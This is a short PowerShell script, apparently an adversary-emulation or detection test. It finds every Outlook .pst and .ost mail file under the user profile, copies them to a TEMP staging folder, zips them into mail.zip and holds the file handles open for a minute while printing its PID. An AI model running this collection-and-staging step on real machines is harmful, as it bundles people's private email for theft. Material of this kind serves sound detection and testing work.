$stage = "$env:TEMP\stage"
New-Item $stage -ItemType Directory -Force | Out-Null
Write-Host "PID: $PID"

$files = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.pst,*.ost -File -Force -ErrorAction SilentlyContinue
$streams = @()
foreach ($f in $files) {
    Copy-Item $f.FullName "$stage\$($f.Name)" -Force
    $fs = [IO.File]::Open($f.FullName,'Open','Read','ReadWrite')
    $buf = New-Object byte[] 4096
    [void]$fs.Read($buf,0,$buf.Length)
    $streams += $fs
    Write-Host "Read: $($f.FullName)"
}
Compress-Archive -Path "$stage\*" -DestinationPath "$env:TEMP\mail.zip" -Force

Write-Host "Holding handles for 60 sec"
Start-Sleep 60
$streams | ForEach-Object { $_.Dispose() }
Write-Host "Done"